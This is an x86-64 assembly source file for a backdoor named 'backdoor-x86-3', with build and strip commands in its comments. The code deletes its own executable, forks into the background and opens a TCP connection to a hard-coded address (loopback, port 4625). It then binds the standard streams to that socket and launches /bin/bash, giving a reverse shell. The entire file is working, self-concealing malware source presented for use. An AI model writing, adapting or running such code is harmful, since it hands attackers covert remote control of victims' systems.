	global _start
	
_start:
	;; $ nasm -f elf64 -o backdoor-x86-3.o backdoor-x86-3.asm && ld -o backdoor-x86-3 backdoor-x86-3.o
	;; $ sstrip backdoor-x86-3

	;; unlink argv[0]
	mov rdi, [rsp + 8]
	
	xor eax, eax
	add al, 87
	syscall

	;; if (!fork()) exit
	xor eax,eax
	add al, 57
	syscall
	cmp eax, 0
	jnz end
	
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov edi, 2		; PF_INET 2
	mov esi, 1		; SOCK_STREAM
	mov edx, 6              ; IPPROTO_TCP
	xor eax,eax
	add al, 41
	syscall
	
	mov r8, rax		; FD should be 4 or 5

	;; connect (s [rbp+0], addr, 16)
	mov rdi, r8
 	lea rsi, [rel addr]
	add  rdx,10
	xor eax,eax
	add al, 42
	syscall
	
	xor rsi, rsi
	call _dup2
	inc rsi
	call _dup2
	inc rsi
	call _dup2
	
	;; Exec
 	lea rdi, [rel shell]
	xor rsi,rsi
	xor rdx,rdx
	xor eax,eax
	add al, 59
	syscall

end:
	xor rdi, rdi
	xor eax,eax
	add al, 60
	syscall
	
_dup2:
	xor eax, eax
	add al, 33
	syscall
	ret
	
	addr dq 0x0100007f11120002
	shell db "/bin/bash",0
